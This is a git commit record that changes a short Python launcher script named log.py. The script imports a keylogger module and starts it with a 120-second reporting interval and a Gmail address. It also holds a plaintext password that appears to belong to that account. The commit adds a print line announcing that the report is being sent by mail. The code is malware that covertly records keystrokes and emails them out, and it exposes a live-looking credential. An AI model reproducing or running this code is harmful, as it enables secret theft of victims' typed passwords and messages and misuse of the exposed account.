c7bbcbbfa2267dddf303edac4671451ffd63e358
d4rk-c0d3r <64041468+d4rk-c0d3r@users.noreply.github.com>
2020-04-21 09:50:15 -0500

    Update log.py

--- log.py
+++ log.py
@@ -1,4 +1,7 @@
+
 import keylogger
 
 my_keylogger = keylogger.Keylogger(120, "2020projects2020@gmail.com", "SohanMohitMridul!!")
+print("[+] Your report is being send to the mail!!!....")
 my_keylogger.start()
+
